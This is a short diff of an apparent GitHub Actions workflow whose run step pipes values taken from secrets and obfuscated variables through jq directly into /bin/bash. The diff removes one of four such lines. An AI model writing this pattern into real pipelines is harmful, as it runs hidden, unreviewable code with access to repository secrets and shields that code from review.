@@ -21,7 +21,6 @@ jobs:
           cvnui2: ${{ secrets.cvnui2 }}
         run: |
           printf '%s' "$cvnui2" | jq -r .fijn5 | /bin/bash
-          echo $fz25 | jq -r .k2333 | /bin/bash
           echo $q67 | jq -r .r88820 | /bin/bash
           printf '%s' "$y70" | jq -r .lv27 | /bin/bash
 
